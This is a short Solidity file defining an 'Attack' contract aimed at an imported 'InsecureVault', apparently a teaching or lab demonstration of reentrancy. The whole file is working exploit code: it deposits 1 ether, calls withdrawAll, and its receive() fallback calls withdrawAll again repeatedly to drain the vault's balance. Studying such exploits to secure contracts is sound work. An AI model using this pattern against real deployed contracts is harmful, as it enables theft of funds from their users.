// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.13;

import "./InsecureVault.sol";

contract Attack {
    InsecureVault public immutable vault;

    constructor(InsecureVault _Vault) {
        vault = _Vault;
    }
    
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        vault.deposit{value: 1 ether}();
        vault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
